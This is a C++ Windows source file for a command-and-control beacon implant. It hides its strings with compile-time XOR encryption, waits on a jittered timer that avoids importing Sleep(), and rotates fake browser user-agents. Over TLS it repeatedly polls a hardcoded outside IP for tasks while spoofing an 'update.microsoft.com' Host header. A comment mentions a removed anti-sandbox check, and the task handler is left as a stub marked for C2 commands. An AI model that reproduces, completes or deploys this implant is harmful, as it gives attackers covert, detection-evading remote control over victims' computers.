#define _CRT_SECURE_NO_WARNINGS

#include <WinSock2.h>
#include <Windows.h>

#define SECURITY_WIN32

#include <security.h>
#include <schannel.h>
#include <sspi.h>
#include <ws2tcpip.h>
#include <string>
#include <vector>
#include <random>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "crypt32.lib")

// ============================================================
// COMPILE-TIME STRING ENCRYPTION
// ============================================================
constexpr char XOR_KEY = 0x5A;

template<size_t N>
struct EncryptedString {
    char data[N];
    constexpr EncryptedString(const char(&str)[N]) : data{} {
        for (size_t i = 0; i < N; i++) data[i] = str[i] ^ XOR_KEY;
    }
    std::string decrypt() const {
        std::string out(N - 1, 0);
        for (size_t i = 0; i < N - 1; i++) out[i] = data[i] ^ XOR_KEY;
        return out;
    }
};

#define ENC(str) EncryptedString<sizeof(str)>(str)

// ============================================================
// JITTERED SLEEP (NO Sleep() IMPORT)
// ============================================================
void jitteredSleep(int minMs, int maxMs) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> jitter(minMs, maxMs);
    int sleepTime = jitter(gen);

    HANDLE hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
    if (hEvent) {
        WaitForSingleObject(hEvent, sleepTime);
        CloseHandle(hEvent);
    }
}

// ============================================================
// RANDOM USER-AGENT
// ============================================================
std::string getRandomUA() {
    std::vector<std::string> uas = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36"
    };
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<size_t> dist(0, uas.size() - 1);
    return uas[dist(gen)];
}

// ============================================================
// TRIG STUFF (REMOVED - WAS ANTI-SANDBOX TELL)
// ============================================================

// ============================================================
// SChannel TLS CONTEXT
// ============================================================
struct TlsContext {
    CredHandle credHandle;
    CtxtHandle ctxtHandle;
    SOCKET sock;
    bool initialized;
};

// ============================================================
// INITIALIZE SChannel
// ============================================================
bool initSChannel(TlsContext& ctx) {
    SCHANNEL_CRED schannelCred = { 0 };
    schannelCred.dwVersion = SCHANNEL_CRED_VERSION;
    schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;
    schannelCred.dwFlags = SCH_CRED_NO_DEFAULT_CREDS | SCH_CRED_MANUAL_CRED_VALIDATION;

    TimeStamp ts;
    SECURITY_STATUS status = AcquireCredentialsHandleA(
        NULL, const_cast<LPSTR>(UNISP_NAME_A), SECPKG_CRED_OUTBOUND,
        NULL, &schannelCred, NULL, NULL, &ctx.credHandle, &ts
    );
    if (status != SEC_E_OK) return false;

    ctx.initialized = true;
    return true;
}

// ============================================================
// CONNECT WITH TLS
// ============================================================
bool connectTls(TlsContext& ctx, const std::string& ip, int port) {
    // Create raw socket
    ctx.sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ctx.sock == INVALID_SOCKET) return false;

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &serverAddr.sin_addr);

    if (connect(ctx.sock, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(ctx.sock);
        return false;
    }

    // Initialize TLS handshake
    SecBuffer outBuffers[1];
    outBuffers[0].BufferType = SECBUFFER_TOKEN;
    outBuffers[0].pvBuffer = NULL;
    outBuffers[0].cbBuffer = 0;

    SecBufferDesc outBufferDesc;
    outBufferDesc.ulVersion = SECBUFFER_VERSION;
    outBufferDesc.cBuffers = 1;
    outBufferDesc.pBuffers = outBuffers;

    DWORD dwSSPIFlags = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT |
        ISC_REQ_CONFIDENTIALITY | ISC_RET_EXTENDED_ERROR |
        ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM;

    DWORD dwSSPIOutFlags = 0;
    TimeStamp ts;

    SECURITY_STATUS status = InitializeSecurityContextA(
        &ctx.credHandle, NULL, NULL, dwSSPIFlags, 0, 0,
        NULL, 0, &ctx.ctxtHandle, &outBufferDesc,
        &dwSSPIOutFlags, &ts
    );

    if (status != SEC_I_CONTINUE_NEEDED) {
        closesocket(ctx.sock);
        return false;
    }

    // Send ClientHello
    if (outBuffers[0].cbBuffer && outBuffers[0].pvBuffer) {
        send(ctx.sock, (const char*)outBuffers[0].pvBuffer, outBuffers[0].cbBuffer, 0);
        FreeContextBuffer(outBuffers[0].pvBuffer);
    }

    // Receive ServerHello and continue handshake
    char buffer[4096];
    int bytesReceived = recv(ctx.sock, buffer, sizeof(buffer), 0);
    if (bytesReceived <= 0) {
        closesocket(ctx.sock);
        return false;
    }

    SecBuffer inBuffers[2];
    inBuffers[0].BufferType = SECBUFFER_TOKEN;
    inBuffers[0].pvBuffer = buffer;
    inBuffers[0].cbBuffer = bytesReceived;
    inBuffers[1].BufferType = SECBUFFER_EMPTY;
    inBuffers[1].pvBuffer = NULL;
    inBuffers[1].cbBuffer = 0;

    SecBufferDesc inBufferDesc;
    inBufferDesc.ulVersion = SECBUFFER_VERSION;
    inBufferDesc.cBuffers = 2;
    inBufferDesc.pBuffers = inBuffers;

    do {
        outBuffers[0].BufferType = SECBUFFER_TOKEN;
        outBuffers[0].pvBuffer = NULL;
        outBuffers[0].cbBuffer = 0;

        status = InitializeSecurityContextA(
            &ctx.credHandle, &ctx.ctxtHandle, NULL, dwSSPIFlags, 0, 0,
            &inBufferDesc, 0, NULL, &outBufferDesc,
            &dwSSPIOutFlags, &ts
        );

        if (status == SEC_E_OK || status == SEC_I_CONTINUE_NEEDED) {
            if (outBuffers[0].cbBuffer && outBuffers[0].pvBuffer) {
                send(ctx.sock, (const char*)outBuffers[0].pvBuffer, outBuffers[0].cbBuffer, 0);
                FreeContextBuffer(outBuffers[0].pvBuffer);
            }
        }

        if (status == SEC_E_OK) break;
        if (status != SEC_I_CONTINUE_NEEDED) {
            closesocket(ctx.sock);
            return false;
        }

        bytesReceived = recv(ctx.sock, buffer, sizeof(buffer), 0);
        if (bytesReceived <= 0) {
            closesocket(ctx.sock);
            return false;
        }

        inBuffers[0].BufferType = SECBUFFER_TOKEN;
        inBuffers[0].pvBuffer = buffer;
        inBuffers[0].cbBuffer = bytesReceived;
        inBuffers[1].BufferType = SECBUFFER_EMPTY;
    } while (true);

    return true;
}

// ============================================================
// SEND ENCRYPTED DATA OVER TLS
// ============================================================
bool sendTls(TlsContext& ctx, const std::string& data) {
    SecPkgContext_StreamSizes sizes;
    SECURITY_STATUS status = QueryContextAttributesA(&ctx.ctxtHandle, SECPKG_ATTR_STREAM_SIZES, &sizes);
    if (status != SEC_E_OK) return false;

    std::vector<BYTE> buffer(sizes.cbHeader + data.length() + sizes.cbTrailer);
    memcpy(buffer.data() + sizes.cbHeader, data.c_str(), data.length());

    SecBuffer buffers[3];
    buffers[0].BufferType = SECBUFFER_STREAM_HEADER;
    buffers[0].pvBuffer = buffer.data();
    buffers[0].cbBuffer = sizes.cbHeader;
    buffers[1].BufferType = SECBUFFER_DATA;
    buffers[1].pvBuffer = buffer.data() + sizes.cbHeader;
    buffers[1].cbBuffer = data.length();
    buffers[2].BufferType = SECBUFFER_STREAM_TRAILER;
    buffers[2].pvBuffer = buffer.data() + sizes.cbHeader + data.length();
    buffers[2].cbBuffer = sizes.cbTrailer;

    SecBufferDesc desc;
    desc.ulVersion = SECBUFFER_VERSION;
    desc.cBuffers = 3;
    desc.pBuffers = buffers;

    status = EncryptMessage(&ctx.ctxtHandle, 0, &desc, 0);
    if (status != SEC_E_OK) return false;

    int totalSize = buffers[0].cbBuffer + buffers[1].cbBuffer + buffers[2].cbBuffer;
    int sent = 0;
    while (sent < totalSize) {
        int ret = send(ctx.sock, (const char*)buffer.data() + sent, totalSize - sent, 0);
        if (ret <= 0) return false;
        sent += ret;
    }
    return true;
}

// ============================================================
// RECEIVE DECRYPTED DATA OVER TLS
// ============================================================
std::string recvTls(TlsContext& ctx) {
    std::string result;
    char rawBuffer[8192];

    while (true) {
        int bytesReceived = recv(ctx.sock, rawBuffer, sizeof(rawBuffer), 0);
        if (bytesReceived <= 0) break;

        SecBuffer buffers[4];
        buffers[0].BufferType = SECBUFFER_DATA;
        buffers[0].pvBuffer = rawBuffer;
        buffers[0].cbBuffer = bytesReceived;
        buffers[1].BufferType = SECBUFFER_EMPTY;
        buffers[2].BufferType = SECBUFFER_EMPTY;
        buffers[3].BufferType = SECBUFFER_EMPTY;

        SecBufferDesc desc;
        desc.ulVersion = SECBUFFER_VERSION;
        desc.cBuffers = 4;
        desc.pBuffers = buffers;

        SECURITY_STATUS status = DecryptMessage(&ctx.ctxtHandle, &desc, 0, NULL);
        if (status == SEC_E_OK) {
            for (int i = 0; i < 4; i++) {
                if (buffers[i].BufferType == SECBUFFER_DATA && buffers[i].cbBuffer > 0) {
                    result.append((const char*)buffers[i].pvBuffer, buffers[i].cbBuffer);
                }
            }
            break;
        }
        else if (status == SEC_I_CONTINUE_NEEDED) {
            continue;
        }
        else {
            break;
        }
    }

    return result;
}

// ============================================================
// CLEANUP TLS
// ============================================================
void cleanupTls(TlsContext& ctx) {
    if (ctx.initialized) {
        DeleteSecurityContext(&ctx.ctxtHandle);
        FreeCredentialsHandle(&ctx.credHandle);
        ctx.initialized = false;
    }
    if (ctx.sock != INVALID_SOCKET) {
        closesocket(ctx.sock);
        ctx.sock = INVALID_SOCKET;
    }
}

// ============================================================
// BUILD HTTP REQUEST
// ============================================================
std::string buildHttpRequest(const std::string& host, const std::string& uri, const std::string& ua) {
    std::string request = "GET " + uri + " HTTP/1.1\r\n";
    request += "Host: " + host + "\r\n";
    request += "User-Agent: " + ua + "\r\n";
    request += "Accept: */*\r\n";
    request += "Connection: close\r\n";
    request += "\r\n";
    return request;
}

// ============================================================
// EXECUTE TASK (PLACEHOLDER)
// ============================================================
void executeTask(const std::string& task) {
    // Parse task and execute
    // This is where you'd handle C2 commands
    // For now, just store it
    (void)task;
}

// ============================================================
// MAIN BEACON LOOP
// ============================================================
int main() {
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    // Decrypt strings at runtime
    std::string serverIp = ENC("58.104.99.223").decrypt();
    std::string taskUri = ENC("/agent/next-task").decrypt();
    std::string hostHeader = ENC("update.microsoft.com").decrypt();

    // Main beacon loop
    while (true) {
        TlsContext ctx = { 0 };
        ctx.sock = INVALID_SOCKET;

        if (initSChannel(ctx)) {
            if (connectTls(ctx, serverIp, 443)) {
                std::string ua = getRandomUA();
                std::string request = buildHttpRequest(hostHeader, taskUri, ua);

                if (sendTls(ctx, request)) {
                    std::string response = recvTls(ctx);
                    if (!response.empty()) {
                        // Extract body from HTTP response
                        size_t bodyPos = response.find("\r\n\r\n");
                        if (bodyPos != std::string::npos) {
                            std::string body = response.substr(bodyPos + 4);
                            executeTask(body);
                        }
                    }
                }
            }
            cleanupTls(ctx);
        }

        // Jittered sleep (3-15 seconds)
        jitteredSleep(3000, 15000);
    }

    WSACleanup();
    return 0;
}